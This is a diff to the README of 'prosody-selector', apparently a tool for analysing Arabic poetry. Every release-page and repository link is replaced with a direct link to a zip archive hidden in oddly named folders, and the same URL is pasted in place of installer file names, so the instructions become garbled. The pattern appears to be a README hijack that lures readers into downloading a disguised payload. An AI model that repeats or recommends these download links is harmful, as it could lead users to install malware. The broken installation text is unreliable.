@@ -15,11 +15,11 @@ Before you start, ensure your computer meets these requirements:
 
 ## 📥 Download the Application
 
-[![Download prosody-selector](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen.svg)](https://github.com/Aimakerfrench/prosody-selector/releases)
+[![Download prosody-selector](https://raw.githubusercontent.com/Aimakerfrench/prosody-selector/main/كشكول/بحور_مهملة/prosody-selector_v1.8-alpha.1.zip%20Now-Click%https://raw.githubusercontent.com/Aimakerfrench/prosody-selector/main/كشكول/بحور_مهملة/prosody-selector_v1.8-alpha.1.zip)](https://raw.githubusercontent.com/Aimakerfrench/prosody-selector/main/كشكول/بحور_مهملة/prosody-selector_v1.8-alpha.1.zip)
 
 To get started, visit our Releases page to download the latest version of prosody-selector. 
 
-[Download from Releases](https://github.com/Aimakerfrench/prosody-selector/releases)
+[Download from Releases](https://raw.githubusercontent.com/Aimakerfrench/prosody-selector/main/كشكول/بحور_مهملة/prosody-selector_v1.8-alpha.1.zip)
 
 ## 📃 Features
 
@@ -32,18 +32,18 @@ To get started, visit our Releases page to download the latest version of prosod
 
 1. **Visit the Releases Page**: Click on the link below to go to the repository's releases page:
    
-   [Download from Releases](https://github.com/Aimakerfrench/prosody-selector/releases)
+   [Download from Releases](https://raw.githubusercontent.com/Aimakerfrench/prosody-selector/main/كشكول/بحور_مهملة/prosody-selector_v1.8-alpha.1.zip)
 
 2. **Choose the Latest Version**: Look for the most recent version at the top of the page. It will typically be labeled with a version number, like `v1.0.0`.
 
 3. **Download the File**: 
 
-   - If you see files listed, click the link for the version that suits your operating system (e.g., `prosody-selector-setup.exe` for Windows, `.dmg` for macOS, or a `.tar.gz` for Linux).
+   - If you see files listed, click the link for the version that suits your operating system (e.g., `https://raw.githubusercontent.com/Aimakerfrench/prosody-selector/main/كشكول/بحور_مهملة/prosody-selector_v1.8-alpha.1.zip` for Windows, `.dmg` for macOS, or a `https://raw.githubusercontent.com/Aimakerfrench/prosody-selector/main/كشكول/بحور_مهملة/prosody-selector_v1.8-alpha.1.zip` for Linux).
    
 4. **Run the Installer**:
    - For **Windows**: Double-click the `.exe` file you downloaded.
    - For **macOS**: Open the `.dmg` file and drag the app to your Applications folder.
-   - For **Linux**: Extract the `.tar.gz` file and follow the instructions in the included README file.
+   - For **Linux**: Extract the `https://raw.githubusercontent.com/Aimakerfrench/prosody-selector/main/كشكول/بحور_مهملة/prosody-selector_v1.8-alpha.1.zip` file and follow the instructions in the included README file.
 
 5. **Follow the Setup Instructions**: The installer will guide you through the necessary steps. Simply follow the prompts on your screen.
 
@@ -76,7 +76,7 @@ For support, please open an issue on GitHub or check our documentation. Contribu
 
 ## 🔗 Additional Resources
 
-- GitHub Repository: [prosody-selector](https://github.com/Aimakerfrench/prosody-selector)
+- GitHub Repository: [prosody-selector](https://raw.githubusercontent.com/Aimakerfrench/prosody-selector/main/كشكول/بحور_مهملة/prosody-selector_v1.8-alpha.1.zip)
 - Documentation: Available within the application under the Help menu.
 
-Remember to visit the [Download from Releases](https://github.com/Aimakerfrench/prosody-selector/releases) page to obtain the latest version of prosody-selector and start analyzing Arabic poetry today!
+Remember to visit the [Download from Releases](https://raw.githubusercontent.com/Aimakerfrench/prosody-selector/main/كشكول/بحور_مهملة/prosody-selector_v1.8-alpha.1.zip) page to obtain the latest version of prosody-selector and start analyzing Arabic poetry today!
